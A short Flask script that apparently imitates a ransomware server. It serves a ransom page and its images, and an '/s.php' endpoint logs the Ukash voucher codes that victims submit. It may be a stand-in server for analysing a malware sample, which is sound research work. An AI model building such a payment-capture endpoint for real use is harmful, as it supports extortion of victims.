from flask import Flask, send_file, request


app = Flask(__name__)


@app.route("/")
def index():
    return send_file("./index.html")


@app.route("/jpeg/<img>")
def serve_image(img):
    return send_file(f"./jpeg/{img}.jpg")


@app.route("/s.php")
def get_ukash_code():
    code = request.args.get("d")
    print(f"Got code: {code}")
    return '', 200